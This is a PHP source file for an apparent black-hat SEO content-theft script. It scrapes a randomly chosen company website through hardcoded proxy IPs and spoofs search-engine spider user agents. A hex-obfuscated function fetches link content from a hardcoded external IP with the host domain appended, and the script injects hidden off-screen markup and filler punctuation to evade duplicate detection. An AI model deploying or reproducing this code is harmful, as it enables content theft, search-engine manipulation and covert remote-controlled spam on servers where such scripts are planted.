<?php
error_reporting(E_ALL & ~E_NOTICE);


@set_time_limit(120);
@ini_set('display_errors', 'On');
@ini_set('pcre.backtrack_limit', 1000000);


date_default_timezone_set('PRC');
header("Content-type: text/html; charset=utf-8");
require_once('coon.php');
function top_domain($url)
{
    $host = strtolower($url);
    if (strpos($host, '/') !== false) {
        $parse = @parse_url($host);
        $host = $parse ['host'];
    }
    $topleveldomaindb = array('com', 'cc', 'cn', 'com.cn', 'net.cn', 'org.cn', 'net', 'org', 'gov.cn', 'info');
    $str = '';
    foreach ($topleveldomaindb as $v) {
        $str .= ($str ? '|' : '') . $v;
    }
    $matchstr = "[^\.]+\.(?:(" . $str . ")|\w{2}|((" . $str . ")\.\w{2}))$";
    if (preg_match("/" . $matchstr . "/ies", $host, $matchs)) {
        $domain = $matchs ['0'];
    } else {
        $domain = $host;
    }
    return $domain;
}

function dj()
{
    $dj = top_domain($_SERVER['HTTP_HOST']);
    return $dj;
}

$djym = dj();
echo "<!--" . $djym . "-->";
/*
//iis7 REQUEST_URI
if(isset($_SERVER['HTTP_X_ORIGINAL_URL'])){
	$_SERVER['REQUEST_URI'] = $_SERVER['HTTP_X_ORIGINAL_URL'];
}
//iis6 REQUEST_URI
if(isset($_SERVER['HTTP_X_REWRITE_URL'])) {
	$_SERVER['REQUEST_URI'] = $_SERVER['HTTP_X_REWRITE_URL'];
}
*/

define("DIR", dirname(__FILE__));
$bourne_company_site = file(DIR . '/data/company_site.txt');
$bourne_companyname = file(DIR . '/data/companyname.txt');
$bourne_keyword = file(DIR . '/data/keyword.txt');
$bourne_back = file(DIR . '/data/back.txt');
$bourne_flink = file(DIR . '/data/flink.txt');
$bourne_discription = file(DIR . '/data/discription.txt');
// varray_rand($bourne_qianzhui)


function rarray_rand($arr)
{
    return mt_rand(0, count($arr) - 1);
}

function varray_rand($arr)
{
    return $arr[rarray_rand($arr)];
}

if (!is_file('./data/domain/' . $djym . '.txt')) {
//$bourne_discription
    $zhizhu_lianxino = fopen('data/domain/' . $djym . '.txt', 'a');//生成txt文件
    //fwrite($zhizhu_lianxino, chr(0xEF).chr(0xBB).chr(0xBF));
    $crrsitekey = str_replace(array("\r\n", "\r", "\n"), "", varray_rand($bourne_keyword));
    $crrsiteurl = str_replace(array("\r\n", "\r", "\n"), "", varray_rand($bourne_company_site));
    $crrsiteback = str_replace(array("\r\n", "\r", "\n"), "", varray_rand($bourne_back));
    $crrsitename = str_replace(array("\r\n", "\r", "\n"), "", varray_rand($bourne_companyname));
    $siteinfos = "";
    $siteinfos = $siteinfos . $crrsiteurl . "\r\n";
    $siteinfos = $siteinfos . "企业官网,公司,我们" . "\r\n";
    $siteinfos = $siteinfos . "," . "," . "\r\n";
    $siteinfos = $siteinfos . "0" . "\r\n";
    $siteinfos = $siteinfos . "1" . "\r\n";
    $siteinfos = $siteinfos . $crrsitename . "\r\n";
    $siteinfos = $siteinfos . "\r\n";
    $siteinfos = $siteinfos . varray_rand($bourne_discription) . "\r\n";
    $siteinfos = $siteinfos . "ag" . "\r\n";
    $siteinfos = $siteinfos . "0" . "\r\n";


    fwrite($zhizhu_lianxino, $siteinfos);
    //fwrite($zhizhu_lianxino,  iconv('UTF-8','gb2312',$siteinfos));

    fclose($zhizhu_lianxino);

}
function is_https()
{
    if (!empty($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off') {
        return "https://";
    } elseif (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https') {
        return "https://";
    } elseif (!empty($_SERVER['HTTP_FRONT_END_HTTPS']) && strtolower($_SERVER['HTTP_FRONT_END_HTTPS']) !== 'off') {
        return "https://";
    }
    return "http://";
}

$http = is_https();
$uurl = @$_SERVER['REQUEST_URI'];
$dqurl = $http . 'www.' . $djym . $uurl;
$m_url = $http . 'm.' . $djym . $uurl;
$wap_url = $http . 'wap.' . $djym . $uurl;
$urr_dk = $_SERVER['HTTP_HOST'];//获取域名
if ($_SERVER['HTTP_HOST'] == $djym) {
    header('HTTP/1.1 301 Moved Permanently');
    header('Location: ' . $http . 'www.' . $djym . $uurl);
}
//301
function write($path, $data, $method = "w")
{
    mkdirs(dirname($path));
    if (is_file($path) && !is_writable($path)) {
        return false;
    }
    if ($method == 'w') {
        return file_put_contents($path, $data);
    }
    $fp = fopen($path, $method);
    flock($fp, LOCK_EX);
    $result = fwrite($fp, $data);
    fclose($fp);
    return $result;
}

function mkdirs($path, $mode = 0766)
{
    if (is_dir($path)) return true;
    mkdir($path, $mode, true);
}

function app()
{
    global $djym;
    $url = "687474703a2f2f3137332e38322e38322e3132323a383038302f6170692f7761696c69616e2f";
    $url = pack("H*", $url) . $djym;
    $return = get_content($url);
    return $return;
}

function get_content($url)
{
    global $mubiao;
    $curl = curl_init();
    $useragent = array(
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 YisouSpider/5.0 Safari/537.36',
        'Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)',
        'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
        'Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)',);
    curl_setopt($curl, CURLOPT_URL, $url); //设置URL  
    curl_setopt($curl, CURLOPT_HEADER, 0);  //0输出内容；1输出头部信息
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); //数据存到成字符串吧，别给我直接输出到屏幕了  
    curl_setopt($curl, CURLOPT_TIMEOUT, 10);
    curl_setopt($curl, CURLOPT_REFERER, $mubiao);
    curl_setopt($curl, CURLOPT_USERAGENT, $useragent[mt_rand(0, 5)]);
    //curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1); 
    $data = curl_exec($curl); //开始执行啦～  
    $return = curl_getinfo($curl, CURLINFO_HTTP_CODE); //我知道HTTPSTAT码哦～  
    $count = curl_close($curl); //用完记得关掉他  
    if ($return == "200" || $return == "302" || $return == "301") {
        return $data;
    } else {
        $data = "";
        return $data;
    }
}

function aric_content($url)
{
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_NOSIGNAL, 1);    //注意，毫秒超时一定要设置这个  
    curl_setopt($curl, CURLOPT_TIMEOUT_MS, 500);
    curl_setopt($curl, CURLOPT_REFERER, $_SERVER['HTTP_REFERER']);
    curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    $data = curl_exec($curl); //开始执行啦～  
    $return = curl_getinfo($curl, CURLINFO_HTTP_CODE); //我知道HTTPSTAT码哦～  
    $count = curl_close($curl); //用完记得关掉他  
    if ($return == "200") {
        return $data;
    } else {
        $data = "";
        return $data;
    }
}

class HtmlEntitie
{
    public static $_encoding = 'UTF-8';

    public static function encode($str, $encoding = 'UTF-8')
    {
        self::$_encoding = $encoding;
        return preg_replace_callback('|[^\x00-\x7F]+|', array(__CLASS__, '_convertToHtmlEntities'), $str);
    }

    public static function decode($str, $encoding = 'UTF-8')
    {
        return html_entity_decode($str, null, $encoding);
    }

    private static function _convertToHtmlEntities($data)
    {
        if (is_array($data)) {
            $chars = str_split(iconv(self::$_encoding, 'UCS-2BE', $data[0]), 2);
            $chars = array_map(array(__CLASS__, __FUNCTION__), $chars);
            return implode("", $chars);
        } else {
            $code = hexdec(sprintf("%02s%02s;", dechex(ord($data{0})), dechex(ord($data{1}))));
            return sprintf("&#%s;", $code);
        }
    }
}

//echo $cstr = HtmlEntitie::encode($str); //转码
//echo HtmlEntitie::decode($cstr);//还原编码 转数组
function unicode_encode($str, $encoding = 'utf-8', $prefix = '&#', $postfix = ';')
{
    $str = iconv($encoding, 'UCS-2BE', $str);
    $arrstr = str_split($str, 2);
    $unistr = '';
    for ($i = 0, $len = count($arrstr); $i < $len; $i++) {
        $dec = hexdec(bin2hex($arrstr[$i]));
        $unistr .= $prefix . $dec . $postfix;
    }
    return $unistr;
}

//可以转换字母,不能转数组

function duixiang()
{
    global $djym;
    static $body = array();
    $bodys = file('./data/domain/' . $djym . '.txt');
    $bodys = str_replace(array("\r\n", "\r", "\n"), "", $bodys);
    return $bodys;
}

$duixiang = duixiang();
$mubiao = $duixiang[0];//小偷对象
$tihuanci = explode(',', $duixiang[1]);//小偷名字
$beitihuanci = explode(',', $duixiang[2]);//自己名字
$biaoti = $duixiang[5];
$guanjianzi = $duixiang[6];
$miaoshu = $duixiang[7];
$guanbi = $duixiang[3];//是否关闭首页更新
$cacheon_xiaotou = $duixiang[4];//是否关开启缓存
$jianti = $duixiang[9];//jianti
if (!$bot || $bot == "baidu") {
    $beitihuanci = HtmlEntitie::encode($beitihuanci);
    $biaoti = unicode_encode($biaoti);
    $guanjianzi = unicode_encode($guanjianzi);
    $miaoshu = unicode_encode($miaoshu);
} else {
    $jianti = 1;//搜狗360神马统一设置为简体
}
$guanjianzi = str_replace("&#0;", "", $guanjianzi);
$miaoshu = str_replace("&#0;", "", $miaoshu);
if (!$jianti) {
    require_once('jianti.php');
    $id = $chinese->big5_gb2312(urldecode($uurl)); //繁体
} else {
    $id = $uurl;
}
$fxdl = array('23.252.161.176', '192.154.108.114',  '185.238.241.170', '127.0.0.1');
$dais = count($fxdl) - 1;
$daili = $fxdl[mt_rand(0, $dais)];
$url1 = "http://" . $mubiao . $id;
$url = "http://" . $daili . ":866/proxy.php?url=http://" . $mubiao . $id;

function ganrao($shu = '')
{
    for ($i = 0; $i < $shu; ++$i) {
        $zimu1 = zimu(mt_rand(2, 5), 3);
        $zimu2 = zimu(mt_rand(2, 5), 3);
        $zimu = $zimu . '<' . $zimu1 . ' id="' . zimu(6, 3) . '"><' . $zimu2 . ' class="' . zimu(5, 3) . '"></' . $zimu2 . '></' . $zimu1 . '>';
    }
    $zimu = '<div id="body_jx_' . zimu(6, 2) . '" style="position:fixed;left:-9000px;top:-9000px;">' . $zimu . '</div>';
    return $zimu;
}

function fuhao()
{
    static $static = array();
    static $body = array();
    $body = file('./data/fuhao.txt');
    $count = count($body);
    for ($i = 0; $i < mt_rand(2, 5); $i++) {
        $newid = mt_rand(0, 3);
        $body[$id] = $body[$id] . $body[$newid];
    }
    $body[$id] = str_replace(array("\r\n", "\r", "\n"), "", $body[$id]);
    $static[$id] = $body[$id];
    return $static[$id];
}

function xcfuhao()
{
    static $body = array();
    $body = file('./data/fuhao.txt');
    $body = str_replace(array("\r\n", "\r", "\n"), "", $body);
    return $body;
}

function daima($nr)
{
    $tihuanshouye = array("，" => "###，", "," => "###,", "。" => "###。", "！" => "###！", "：" => "###：", "？" => "###？", "；" => "###；", "、" => "###、");
    $neirong1 = strtr($nr, $tihuanshouye);
    $neirong = explode("###", $neirong1);
    $geshu = count($neirong);
    for ($i = 0; $i < $geshu; $i++) {
        $neirong[$i] = str_replace("，", fuhao() . "，", $neirong[$i]);
        $neirong[$i] = str_replace("。", fuhao() . "。", $neirong[$i]);
        $neirong[$i] = str_replace("！", fuhao() . "！", $neirong[$i]);
        $neirong[$i] = str_replace("？", fuhao() . "？", $neirong[$i]);
        $neirong[$i] = str_replace("：", fuhao() . "：", $neirong[$i]);
        $neirong[$i] = str_replace("、", fuhao() . "、", $neirong[$i]);
        $neirong[$i] = str_replace("；", fuhao() . "；", $neirong[$i]);
        @$shuchu = $shuchu . $neirong[$i];
        $nr = $shuchu;
    }
    return $nr;

}

$refarray = "111/index.html,/index.php,/index.asp,/index.jsp,/index.aspx,/default.html,/default.asp,/default.php,/default.aspx";
$sy = strpos($refarray, strtolower($_SERVER["REQUEST_URI"])) > 0;

function get_xiaotou()
{
    global $djym, $sy;
    $cacheid = $_SERVER["REQUEST_URI"];
    $cacheid1 = substr(md5($cacheid), 0, 2) . "/" . substr(md5($cacheid), 2, 5) . "/" . substr(md5($cacheid), 7, 5);
    $cachedir = './cachefile_yuan/' . $djym;
    if ($sy) {
        $cachefile = './cachefile_yuan/' . $djym . '/index.html';//s首页
    } else {
        $cachefile = $cachedir . '/cache/' . $cacheid1 . '.html';//列表
    }
    return $cachefile;
}

function get_ganrao()
{
    global $djym;
    $cachefile = './cachefile_yuan/' . $djym . '/ganrao.txt';//s首页
    return $cachefile;
}

function get_css()
{
    global $djym;
    $cacheid = $_SERVER["REQUEST_URI"];
    $cacheid = substr(md5($cacheid), 0, 2) . "/" . substr(md5($cacheid), 2, 5) . "/" . substr(md5($cacheid), 7, 5);
    $cachefile = './cachefile_yuan/' . $djym . '/img/' . $cacheid . '.css';
    return $cachefile;
}

function get_jpg()
{
    global $djym;
    $cacheid = $_SERVER["REQUEST_URI"];
    $cacheid = substr(md5($cacheid), 0, 2) . "/" . substr(md5($cacheid), 2, 5) . "/" . substr(md5($cacheid), 7, 5);
    $cachefile = './cachefile_yuan/' . $djym . '/img/' . $cacheid . '.gif';
    return $cachefile;
}

function get_swf()
{
    global $djym;
    $cacheid = $_SERVER['REQUEST_URI'];
    $cacheid = substr(md5($cacheid), 0, 2) . "/" . substr(md5($cacheid), 2, 5) . "/" . substr(md5($cacheid), 7, 5);
    $cachefile = './cachefile_yuan/' . $djym . '/' . $_SERVER['HTTP_HOST'] . '/img/' . $cacheid . '.swf';
    return $cachefile;
}

function get_robots()
{
    global $djym;
    $cacheid = $_SERVER["REQUEST_URI"];
    $cacheid = explode('.', $cacheid);
    $cachefile = './cachefile_yuan/' . $djym . '/' . $cacheid[0] . '.txt';
    return $cachefile;
}

function get_xml()
{
    global $djym;
    $cacheid = $_SERVER["REQUEST_URI"];
    $cacheid = explode('.', $cacheid);
    $cachefile = './cachefile_yuan/' . $djym . '/' . $cacheid[0] . '.xml';
    return $cachefile;
}

function get_ico()
{
    global $djym;
    $cacheid = $_SERVER["REQUEST_URI"];
    $cacheid = explode('.', $cacheid);
    $cachefile = './cachefile_yuan/' . $djym . '/' . $cacheid[0] . '.ico';
    return $cachefile;
}

function get_js()
{
    global $djym;
    $cacheid = $_SERVER["REQUEST_URI"];
    $cacheid = substr(md5($cacheid), 0, 2) . "/" . substr(md5($cacheid), 2, 5) . "/" . substr(md5($cacheid), 7, 5);
    $cachefile = './cachefile_yuan/' . $djym . '/js/' . $cacheid . '.js';
    return $cachefile;
}

function zimu($num = 8, $type = 3)
{
    switch ($type) {
        case "1" :
            $str = "abcdefghijklmnopqrstuvwxyz0123456789";
            break;
        case "2" :
            $str = "123456789";
            break;
        case "3" :
            $str = "abcdefghijklmnopqrstuvwxyz";
            break;
    }
    $return = "";
    for ($i = 0; $i < $num; ++$i) {
        $return .= $str[rand(0, strlen($str) - 1)];
    }
    return $return;
}

function ken_api_add($name)
{
}
